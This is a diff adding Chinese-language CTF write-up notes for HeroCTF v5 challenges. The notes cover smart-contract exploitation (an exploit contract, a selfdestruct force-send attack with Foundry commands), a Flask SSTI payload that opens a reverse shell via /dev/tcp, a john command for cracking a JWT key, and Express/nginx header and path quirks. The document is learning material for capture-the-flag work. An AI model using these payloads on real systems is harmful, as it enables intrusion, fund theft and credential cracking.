@@ -1737,3 +1737,73 @@ while true; do curl -i -s -k -X $'POST' \
     --data-binary $'{\"query\":\"mutation { func(param: \\\"value\\\"){id, num} func(param: \\\"value\\\"){id, num} }\"}' \
     $'http://example.com/graphql/console'; done
 ```
+209. [Oh sh. Here we go again ?](https://github.com/m4k2/HeroCTF-V5-WU-Foundry/tree/main#challenge-00--oh-sh-here-we-go-again-)
+- 题目给出contract被deploy的地址后，可以利用[Foundry](https://learnblockchain.cn/docs/foundry/i18n/zh/getting-started/installation.html)命令cast code获取其bytecode。`cast code <addr> --rpc-url $RPC_URL`.其中RPC_URL题目会提供。也可以用node js的web3库
+```js
+const Web3 = require('web3');
+const rpcUrl = ''; // Replace with your custom RPC URL
+const web3 = new Web3(rpcUrl);
+
+const contractAddress = ''; // Replace with the address of the contract you want to retrieve bytecode for
+
+web3.eth.getCode(contractAddress, (error, bytecode) => {
+  if (error) {
+    console.error('Error retrieving contract bytecode:', error);
+  } else {
+    console.log('Contract bytecode:', bytecode);
+  }
+});
+```
+获取的bytecode可以[反编译](https://library.dedaub.com/decompile?md5=911ae673dd624b6cf4924a9acdeef8b0)。
+- 调用指定地址的contract的函数。
+  - `cast send <addr> <func,exa:0x3c5269d8> --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy`.private_key可以通过在另一个窗口运行anvil获取，不过我运行的时候提示gas超了，把gas改高了又有新问题。
+  - 使用solidity。我尝试用remix运行，不过因为remix默认的环境跟题目不在一个chain上，给的rpc url也设置不了，就不了了之了。
+```js
+contract hero2300_pwn
+{
+    function exploit(address addr) public 
+    {
+        addr.call(abi.encodeWithSelector(0x3c5269d8));
+    }
+}
+```
+- 用python web3和blockchain交互的[课程](https://www.youtube.com/watch?v=UBK2BoFv6Lo&list=PLCwnLq3tOElrubfUWHa1qKrJv1apO8Aag)
+210. [Classic one tbh](https://github.com/m4k2/HeroCTF-V5-WU-Foundry/tree/main#challenge-01--classic-one-tbh)
+- [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/)漏洞。特征点：合约判断balance的逻辑依赖于`address(this).balance`。该函数会将一个合约从blockchain上删除，并将合约内剩余的全部ether转账到制定地址。
+```
+The selfdestruct function in Solidity is used to delete a contract from the blockchain and transfer any remaining ether stored in the contract to a specified address.
+
+The selfdestruct function is a built-in function in Solidity that can be called from a contract to delete itself and transfer its remaining ether balance to a specified address.
+
+The selfdestruct function can also be used maliciously to force ether to be sent to a specific target by creating a contract with a selfdestruct function, sending ether to it, and calling selfdestruct(target).
+
+There are three ways to transfer ether in Solidity: transfer, send, and call.value().gas. Each of these ways requires the target to receive the funds to transfer them to the correct address. However, the selfdestruct function can transfer funds without obtaining the funds first.
+
+To prevent vulnerabilities caused by the selfdestruct function, developers can use a local state variable to update the current balance of the contract when the user deposits funds, instead of using address(this).balance.
+```
+攻击合约例子：
+```js
+pragma solidity 0.8.17;
+
+contract Selfdestruct{
+    constructor() payable{
+        require(msg.value == 0.5 ether);
+    }
+
+    function kill(address addr) public {
+        selfdestruct(payable(addr));
+    }
+}
+```
+foundry释放/调用相关命令：
+```
+forge create selfdestruct.sol:Selfdestruct --value 0.5ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
+cast send 0x[Selfdestruct] "kill(address)" 0x[target address] --rpc-url $RPC_URL --private-key $PRIVATE_KEY
+```
+211. [Drink from my Flask #1](https://github.com/HeroCTF/HeroCTF_v5/tree/main/Web/Drink_from_my_Flask_1)
+- python flask ssti+key爆破、session伪造
+    - 反弹shell payload：`{{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/172.17.0.1/9999 0>&1\"').read() }}`,172.17.0.1换为攻击机器外网ip
+    - john爆破session key：`john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256`
+212. [Referrrrer](https://mxcezl.github.io/posts/write-up/ctf/heroctf-v5/web/referrrrer/)
+- express 4.x中，`req.header("Referer")`表示取请求中的Referer字段的值，不过请求传`Referrer`同样可以取到值，两者在源码层面是一样的。而nginx.conf里就不能混用（nginx.conf里看的是`$http_referer`)。
+- 根据文档：`CaseSensitive: Disabled by default`,express 4.x里的路径名大小写不敏感。访问`/a`和`/A`是一样的。而nginx里location的配置是大小写敏感的
